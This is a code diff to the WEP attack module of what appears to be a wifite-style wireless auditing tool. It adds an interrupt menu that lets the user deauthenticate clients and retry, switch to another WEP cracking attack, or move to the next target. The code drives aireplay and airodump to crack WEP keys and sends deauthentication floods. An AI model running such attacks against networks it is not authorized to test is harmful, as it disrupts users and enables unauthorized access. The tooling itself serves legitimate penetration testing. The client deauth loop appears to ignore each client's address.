@@ -33,7 +33,9 @@ class AttackWEP(Attack):
 
         aircrack = None # Aircrack process, not started yet
 
-        for (attack_index, attack_name) in enumerate(Configuration.wep_attacks):
+        attacks_remaining = list(Configuration.wep_attacks)
+        while len(attacks_remaining) > 0:
+            attack_name = attacks_remaining.pop(0)
             # BIG try-catch to capture ctrl+c
             try:
                 # Start Airodump process
@@ -189,7 +191,6 @@ class AttackWEP(Attack):
                                 Color.pl('\n{!} restarting {C}aireplay{W} after' +
                                          ' {C}%d{W} seconds of no new IVs'
                                              % stale_seconds)
-                                Color.pl("\naireplay output:\n%s" % aireplay.get_output())
                                 aireplay = Aireplay(self.target, \
                                                     wep_attack_type, \
                                                     client_mac=client_mac, \
@@ -203,7 +204,10 @@ class AttackWEP(Attack):
                     # End of big while loop
                 # End of with-airodump
             except KeyboardInterrupt:
-                if not self.user_wants_to_continue(attack_index):
+                if len(attacks_remaining) == 0:
+                    self.success = False
+                    return self.success
+                if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
                     self.success = False
                     return self.success
             # End of big try-catch
@@ -212,21 +216,57 @@ class AttackWEP(Attack):
         self.success = False
         return self.success
 
-    def user_wants_to_continue(self, attack_index):
-        ''' Asks user if attacks should continue using remaining methods '''
-        Color.pl('\n{!} {O}interrupted{W}\n')
+    def user_wants_to_stop(self, current_attack, attacks_remaining, target):
+        '''
+            Ask user what attack to perform next (re-orders attacks_remaining, returns False),
+            or if we should stop attacking this target (returns True).
+        '''
+        target_name = target.essid if target.essid_known else target.bssid
 
-        if attack_index + 1 >= len(Configuration.wep_attacks):
-            # No more WEP attacks to perform.
-            return False
+        Color.pl("\n\n{!} {O}Interrupted")
+        Color.pl("{+} {W}Next steps:")
 
-        attacks_remaining = Configuration.wep_attacks[attack_index + 1:]
-        Color.pl("{+} {G}%d{W} attacks remain ({C}%s{W})" % (len(attacks_remaining), ', '.join(attacks_remaining)))
-        prompt = Color.s('{+} type {G}c{W} to {G}continue{W} or {R}s{W} to {R}stop{W}: ')
-        if raw_input(prompt).lower().startswith('s'):
-            return False
-        else:
-            return True
+        # Deauth clients & retry
+        attack_index = 1
+        Color.pl("     {G}1{W}: {O}Deauth clients{W} and {G}retry{W} {C}%s attack{W} against {G}%s{W}" % (current_attack, target_name))
+
+        # Move onto a different WEP attack
+        for attack_name in attacks_remaining:
+            attack_index += 1
+            Color.pl("     {G}%d{W}: Start new {C}%s attack{W} against {G}%s{W}" % (attack_index, attack_name, target_name))
+
+        # Stop attacking entirely
+        attack_index += 1
+        Color.pl("     {G}%d{W}: {R}Stop attacking, {O}Move onto next target{W}" % attack_index)
+        while True:
+            answer = raw_input(Color.s("{?} Select an option ({G}1-%d{W}): " % attack_index))
+            if not answer.isdigit() or int(answer) < 1 or int(answer) > attack_index:
+                Color.pl("{!} {R}Invalid input: {O}Must enter a number between {G}1-%d{W}" % attack_index)
+                continue
+            answer = int(answer)
+            break
+
+        if answer == 1:
+            # Deauth clients & retry
+            num_deauths = 1
+            Color.p("\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...")
+            Aireplay.deauth(target.bssid)
+            for client in target.clients:
+                Color.clear_entire_line()
+                Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.bssid)
+                Aireplay.deauth(target.bssid)
+                num_deauths += 1
+            Color.clear_entire_line()
+            Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % num_deauths)
+            # Re-insert current attack to top of list of attacks remaining
+            attacks_remaining.insert(0, current_attack)
+            return False # Don't stop
+        elif answer == attack_index:
+            return True # Stop attacking
+        elif answer > 1:
+            # User selected specific attack: Re-order attacks based on desired next-step
+            attacks_remaining.insert(0, attacks_remaining.pop(answer-2))
+            return False # Don't stop
 
     def fake_auth(self):
         '''
